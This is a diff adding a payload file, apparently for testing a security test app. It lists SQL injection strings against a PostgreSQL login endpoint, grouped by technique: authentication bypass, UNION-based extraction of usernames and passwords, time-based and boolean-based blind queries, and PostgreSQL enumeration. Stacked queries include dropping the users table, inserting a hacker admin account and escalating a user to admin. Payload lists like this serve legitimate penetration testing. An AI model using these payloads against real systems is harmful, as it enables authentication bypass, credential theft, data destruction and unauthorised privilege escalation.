@@ -1,0 +1,126 @@
+# SQL Injection Payloads for Security Test App
+# Target: POST /login (email, password parameters)
+# Database: PostgreSQL
+
+# ============================================
+# 1. Authentication Bypass (인증 우회)
+# ============================================
+
+# Basic OR-based bypass
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+'OR''='
+admin'--
+admin'/*
+') OR ('1'='1
+') OR ('1'='1'--
+
+# Comment variations
+' OR '1'='1' --
+' OR '1'='1' -- -
+' OR '1'='1' #
+' OR '1'='1' /*comment*/
+
+# ============================================
+# 2. Error-Based (에러 기반)
+# ============================================
+
+# Single quote test
+'
+''
+'''
+
+# Syntax error triggers
+' AND '1'='2
+' AND 1=2--
+' ORDER BY 1--
+' ORDER BY 100--
+' UNION SELECT NULL--
+
+# ============================================
+# 3. UNION-Based (UNION 기반)
+# ============================================
+
+# Column count detection
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+
+# UNION injection (adjust NULL count based on columns)
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+
+# Data extraction (PostgreSQL)
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+# ============================================
+# 4. Time-Based Blind (시간 기반 Blind)
+# ============================================
+
+# PostgreSQL sleep
+' OR pg_sleep(5)--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'||pg_sleep(5)--
+
+# Conditional time delay
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+# ============================================
+# 5. Boolean-Based Blind (Boolean 기반 Blind)
+# ============================================
+
+# True condition
+' AND '1'='1
+' AND 1=1--
+' AND 'a'='a
+
+# False condition
+' AND '1'='2
+' AND 1=2--
+' AND 'a'='b
+
+# Substring extraction
+' AND SUBSTRING(username,1,1)='a'--
+' AND ASCII(SUBSTRING(username,1,1))>97--
+
+# ============================================
+# 6. Stacked Queries (다중 쿼리)
+# ============================================
+
+'; SELECT * FROM users--
+'; DROP TABLE users--
+'; INSERT INTO users (email,password,is_admin) VALUES ('hacker@test.com','hacked',true)--
+'; UPDATE users SET is_admin=true WHERE email='user@test.com'--
+
+# ============================================
+# 7. PostgreSQL Specific
+# ============================================
+
+# Version detection
+' UNION SELECT version(),NULL--
+' AND 1=CAST((SELECT version()) AS int)--
+
+# Current user
+' UNION SELECT current_user,NULL--
+' UNION SELECT user,NULL--
+
+# Database name
+' UNION SELECT current_database(),NULL--
+
+# List tables
+' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
+
+# List columns
+' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--
